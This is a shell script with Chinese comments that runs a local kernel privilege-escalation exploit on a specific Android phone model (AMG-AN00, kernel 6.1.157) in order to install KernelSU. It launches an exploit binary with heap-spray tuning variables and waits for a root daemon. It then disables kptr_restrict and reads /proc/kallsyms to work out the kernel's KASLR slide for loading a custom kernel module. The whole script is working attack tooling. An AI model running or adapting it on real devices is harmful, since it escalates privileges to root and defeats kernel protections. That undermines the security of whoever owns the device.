#!/system/bin/sh
# ============================================================================
# g264-rootonly.sh — GT-2（AMG-AN00 / 6.1.157-g2646292297b1）只提权、不装 KSU
#
# 目的：1.0.32 的 g264 已经能拿到 rootd，但旧的 ksu6157-g264 模块是 g7d 模块
#       只改了 vermagic，init_module 会挂/复位。这里先用 1.0.32 的修正版
#       exploit 拿 root，保持 rootd 活着，读出本 boot 的 _text/_printk/slide，
#       然后由 PC 端按这个 slide 现编 g264 专用 KSU 模块，再 insmod。
#
# 用法（Shizuku/adb shell，uid 2000）：
#   sh /data/local/tmp/g264-rootonly.sh
# 输出里盯这一行：
#   ROOTONLY_SLIDE=0x...
# 把整段输出发回来；在装上新模块之前不要重启。
#
# 注意：一次开机只打一发；如果本 boot 已经打过 98260，先重启再跑。
# ============================================================================
set -u

D=/data/local/tmp/magic
BIN=$D/98260-g264/exploit-android-key-ptr
SU=$D/98260-g264/pc98260-su
SOCK=/data/local/tmp/pc98260-root.sock
LOG=$D/98260-rootonly.log

echo "=== g264 rootonly start $(date 2>/dev/null) ==="
echo "boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
echo "kernel=$(uname -r 2>/dev/null)"
echo "uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)"
_uid=$(id -u 2>/dev/null)
echo "uid=$_uid"
if [ "$_uid" != "2000" ]; then
    echo "FAIL: 当前终端不是 shell（uid=$_uid）。请用 aShell You + Shizuku，看到 uid=2000(shell) 再跑。"
    exit 2
fi

# App 部署下来的文件可能是 0644；shell(2000) 先补可执行位
chmod 755 "$BIN" "$SU" 2>/dev/null

[ -x "$BIN" ] || { echo "FAIL: $BIN 不可执行；先在 1.0.32 里点一次「部署资产」"; exit 2; }
[ -x "$SU" ] || { echo "FAIL: $SU 不可执行"; exit 2; }

# 已有可用 rootd 就复用
if [ -S "$SOCK" ] && [ -x "$SU" ]; then
    _id=$("$SU" -c 'id -u' 2>/dev/null | tr -d '\r\n ')
    if [ "$_id" = "0" ]; then
        echo "REUSE=1 reason=rootd_alive"
        REUSE=1
    else
        echo "REUSE=0 reason=rootd_stale"
        REUSE=0
    fi
else
    REUSE=0
fi

if [ "$REUSE" = "0" ]; then
    echo "--- 1) --check 取 slide ---"
    _ck=$D/98260-check-rootonly.json
    "$BIN" --check > "$_ck" 2>/dev/null
    cat "$_ck" 2>/dev/null
    _slide=$(sed -n 's/.*"slide":"\(0x[0-9a-fA-F]*\)".*/\1/p' "$_ck" 2>/dev/null | tail -1)
    case "$_slide" in
        ""|0x0000000000000000)
            echo "FAIL: --check 没拿到 slide（先确认 1.0.32 的修正版二进制，sha256 应为 cc0b9693…）"
            exit 3 ;;
    esac
    echo "CHECK_SLIDE=$_slide"

    echo "--- 2) 启动 exploit（盲写回收，不装 KSU）---"
    rm -f "$SOCK" 2>/dev/null
    : > "$LOG" 2>/dev/null
    SETSID=""
    if command -v setsid >/dev/null 2>&1; then SETSID=setsid
    elif [ -x /system/bin/toybox ]; then SETSID="/system/bin/toybox setsid"; fi
    if [ -n "$SETSID" ]; then
        $SETSID env \
            PC98260_MAX_ATTEMPTS=12 \
            PC98260_NO_FALLBACK=1 \
            PC98260_BUDGET_S=180 \
            PC98260_WAIT_CAP_S=8 \
            PC98260_CHURN_ROUNDS=8 \
            PC98260_CHURN_PER_CPU=32 \
            PC98260_KSU_SIG=1 \
            PC98260_G264_BLIND_RECLAIM=1 \
            "$BIN" --no-real-cred --slide "$_slide" < /dev/null >> "$LOG" 2>&1 &
    else
        nohup env \
            PC98260_MAX_ATTEMPTS=12 \
            PC98260_NO_FALLBACK=1 \
            PC98260_BUDGET_S=180 \
            PC98260_WAIT_CAP_S=8 \
            PC98260_CHURN_ROUNDS=8 \
            PC98260_CHURN_PER_CPU=32 \
            PC98260_KSU_SIG=1 \
            PC98260_G264_BLIND_RECLAIM=1 \
            "$BIN" --no-real-cred --slide "$_slide" < /dev/null >> "$LOG" 2>&1 &
    fi
    _pid=$!
    echo "EXEC_PID=$_pid log=$LOG"

    echo "--- 3) 等 rootd（最多 240s）---"
    _i=0
    while [ "$_i" -lt 240 ]; do
        [ -S "$SOCK" ] && break
        if ! kill -0 "$_pid" 2>/dev/null; then
            echo "FAIL: exploit 提前退出"
            tail -40 "$LOG" 2>/dev/null
            exit 4
        fi
        [ $((_i % 30)) -eq 29 ] && { echo "WAIT=$((_i+1))s alive=1"; tail -8 "$LOG" 2>/dev/null; }
        sleep 1
        _i=$((_i + 1))
    done
    [ -S "$SOCK" ] || { echo "FAIL: 240s 没等到 rootd"; tail -40 "$LOG" 2>/dev/null; exit 4; }

    echo "--- 4) 验证 uid ---"
    "$SU" -c 'id -u; id -g; getenforce; cat /proc/self/status | grep -E "Uid|Gid"' 2>&1
    _id=$("$SU" -c 'id -u' 2>/dev/null | tr -d '\r\n ')
    [ "$_id" = "0" ] || { echo "FAIL: su 不是 uid=0"; exit 5; }
fi

echo "--- 5) 读本 boot 的 _text/_printk ---"
_out=$("$SU" -c 'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; grep -w -e _text -e _printk /proc/kallsyms' 2>&1)
echo "$_out"
_text=$(printf '%s\n' "$_out" | awk '$3=="_text"{print $1; exit}')
_printk=$(printf '%s\n' "$_out" | awk '$3=="_printk"{print $1; exit}')
case "$_text" in ????????????????) ;; *) echo "FAIL: _text 读不到"; exit 6 ;; esac
_slide=$((0x$_text - 0xffffffc008000000))
printf 'ROOTONLY_TEXT=0x%s\n' "$_text"
printf 'ROOTONLY_PRINTK=0x%s\n' "${_printk:-?}"
printf 'ROOTONLY_SLIDE=0x%x\n' "$_slide"
printf 'ROOTONLY_BOOT=%s\n' "$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
echo "ROOTONLY_READY=1 —— 把上面四行发回去，等现编的 g264 KSU 模块；在 insmod 之前不要重启"
echo "rootd_socket=$SOCK su=$SU"
